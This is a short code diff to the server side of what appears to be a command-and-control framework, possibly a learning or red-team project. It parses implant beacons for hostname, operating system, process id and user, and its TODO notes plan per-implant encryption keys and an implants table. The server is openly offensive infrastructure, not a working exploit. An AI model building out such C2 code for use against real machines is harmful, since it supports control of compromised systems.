@@ -56,16 +56,31 @@ class WebServer(object):
 
     def beacon_response(self):
         """
-        Description:
+        escription:
             This function is called when an implant beacons
         """
         self.data = request.get_data()
 
         # tries to base64 decode beacon post data
         try:
-            base64.b64decode(self.data)
+            decoded = base64.b64decode(self.data).decode()
+
+            # parses json post data
+            j = json.loads(decoded)
+            hostname = j["h"]
+            operating_system = j["o"]
+            process_id = j["p"]
+            current_user = j["u"]
+
+            # TO DO: generate a random 32 character encryption key
+
+            # TO DO: INSERT an entry into the "implants" table here
+
+            # TO DO: "return" random 32 character encryption key in the http response
+
             return "base64 beacon"
 
         # exception means it is an rc4 beacon instead
-        except:
+        except Exception as e:
+            print(str(e))
             return "rc4 beacon"
